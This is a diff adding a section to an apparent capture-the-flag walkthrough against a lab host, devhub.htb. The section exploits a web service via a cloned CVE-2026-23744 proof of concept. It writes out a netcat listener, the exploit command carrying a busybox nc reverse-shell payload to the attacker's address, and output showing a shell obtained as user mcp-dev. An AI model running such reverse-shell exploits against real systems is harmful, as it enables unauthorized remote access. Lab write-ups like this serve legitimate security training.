@@ -70,4 +70,42 @@ This reveals the version is 1.4.2. A search for related exploits reveals the fol
 
 <img src="Images/05-Exploit-Location.png" width="600">
 
+The documentation show's how we can obtain code execution on the server. Let's first start a listener before modifying the exploit so that we can execute a reverse shell:
+
+## Starting the listener:
+
+```
+nc -lvnp 4444
+```
+
+## Downloading the exploit:
+
+```
+git clone https://github.com/boroeurnprach/CVE-2026-23744-PoC
+```
+
+## Running the exploit:
+
+```
+python3 exploit.py devhub.htb 'busybox nc 10.10.14.28 4444 -e /bin/bash'
+```
+
+## Exploit output:
+
+```
+[*] Waiting for server to start on port 6274...
+[+] Server is up and running.
+[*] Sending exploit payload...
+[*] Request failed (this might be expected if the command execution interrupts the connection): HTTPConnectionPool(host='devhub.htb', port=6274): Read timed out. (read timeout=5)
+[+] Payload sent.
+```
+
+## Listener output:
+
+```
+Listening on 0.0.0.0 4444
+Connection received on 10.129.245.216 47714
+id
+uid=1001(mcp-dev) gid=1001(mcp-dev) groups=1001(mcp-dev)
+```
 
